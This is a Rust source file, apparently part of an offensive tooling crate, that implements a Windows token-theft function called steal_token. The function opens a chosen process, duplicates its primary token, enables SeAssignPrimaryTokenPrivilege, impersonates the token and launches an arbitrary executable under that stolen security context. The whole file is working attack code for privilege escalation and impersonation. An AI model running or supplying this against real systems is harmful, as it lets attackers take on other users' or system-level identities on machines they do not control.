use std::path::Path;

use windows::Win32::Foundation::{CloseHandle, HANDLE, LUID};
use windows::Win32::Security::{
    AdjustTokenPrivileges, DuplicateTokenEx, ImpersonateLoggedOnUser, RevertToSelf,
    SecurityAnonymous, TokenPrimary, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES,
    TOKEN_ASSIGN_PRIMARY, TOKEN_DUPLICATE, TOKEN_PRIVILEGES, TOKEN_QUERY,
};
use windows::Win32::System::Threading::{
    CreateProcessAsUserW, OpenProcess, OpenProcessToken, PROCESS_INFORMATION,
    PROCESS_QUERY_LIMITED_INFORMATION, STARTUPINFOW,
};

use crate::error::MiscError;

/// Steal a process token and launch a new process under that token's security context.
///
/// Opens the target process, duplicates its primary token, enables
/// `SeAssignPrimaryTokenPrivilege`, impersonates the token, then calls
/// `CreateProcessAsUserW` to spawn a new process.
///
/// Returns (pid, tid) of the newly created process on success.
///
/// # Arguments
/// * `pid` - PID of the process whose token will be stolen
/// * `exe_path` - Path to the executable to launch
/// * `args` - Command line arguments (can be empty)
pub fn steal_token(pid: u32, exe_path: &str, args: &str) -> Result<(u32, u32), MiscError> {
    // Validate executable exists
    if !Path::new(exe_path).exists() {
        return Err(MiscError::FileNotFound(exe_path.to_string()));
    }

    // Build command line: "exe_path" args
    let cmd_line = if args.is_empty() {
        format!("\"{}\"", exe_path)
    } else {
        format!("\"{}\" {}", exe_path, args)
    };

    let mut cmd_wide: Vec<u16> = cmd_line.encode_utf16().chain(std::iter::once(0)).collect();

    unsafe {
        // Open target process with limited query permissions (sufficient for token access)
        let process_handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
            .map_err(|_| MiscError::OpenProcessFailed(pid))?;

        // Open the process's primary token
        let mut token_handle = HANDLE::default();
        let result = OpenProcessToken(
            process_handle,
            TOKEN_QUERY | TOKEN_DUPLICATE,
            &mut token_handle,
        );

        if result.is_err() {
            let _ = CloseHandle(process_handle);
            return Err(MiscError::OpenTokenFailed(pid));
        }

        // Duplicate the token as a primary token
        let mut new_token_handle = HANDLE::default();
        let result = DuplicateTokenEx(
            token_handle,
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
            None,
            SecurityAnonymous,
            TokenPrimary,
            &mut new_token_handle,
        );

        if result.is_err() {
            let _ = CloseHandle(token_handle);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::DuplicateTokenFailed);
        }

        // Enable SeAssignPrimaryTokenPrivilege (LUID LowPart=3, HighPart=0)
        let mut token_privileges: TOKEN_PRIVILEGES = std::mem::zeroed();
        token_privileges.PrivilegeCount = 1;
        token_privileges.Privileges[0].Luid = LUID {
            LowPart: 3,
            HighPart: 0,
        };
        token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        let result = AdjustTokenPrivileges(
            new_token_handle,
            false,
            Some(&token_privileges),
            0,
            None,
            None,
        );

        if result.is_err() {
            let _ = CloseHandle(new_token_handle);
            let _ = CloseHandle(token_handle);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::AdjustPrivilegesFailed);
        }

        // Impersonate the duplicated token
        let result = ImpersonateLoggedOnUser(new_token_handle);

        if result.is_err() {
            let _ = CloseHandle(new_token_handle);
            let _ = CloseHandle(token_handle);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::ImpersonateFailed);
        }

        // Create a new process under the stolen token
        let mut startup_info: STARTUPINFOW = std::mem::zeroed();
        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

        let result = CreateProcessAsUserW(
            new_token_handle,
            None,
            windows::core::PWSTR(cmd_wide.as_mut_ptr()),
            None,
            None,
            true,
            Default::default(),
            None,
            None,
            &startup_info,
            &mut process_info,
        );

        // Revert security context regardless of result
        let _ = RevertToSelf();

        if result.is_err() {
            let _ = CloseHandle(new_token_handle);
            let _ = CloseHandle(token_handle);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::CreateProcessAsUserFailed(format!(
                "CreateProcessAsUserW failed for {}",
                exe_path
            )));
        }

        let new_pid = process_info.dwProcessId;
        let new_tid = process_info.dwThreadId;

        // Close all handles
        let _ = CloseHandle(process_info.hThread);
        let _ = CloseHandle(process_info.hProcess);
        let _ = CloseHandle(new_token_handle);
        let _ = CloseHandle(token_handle);
        let _ = CloseHandle(process_handle);

        Ok((new_pid, new_tid))
    }
}
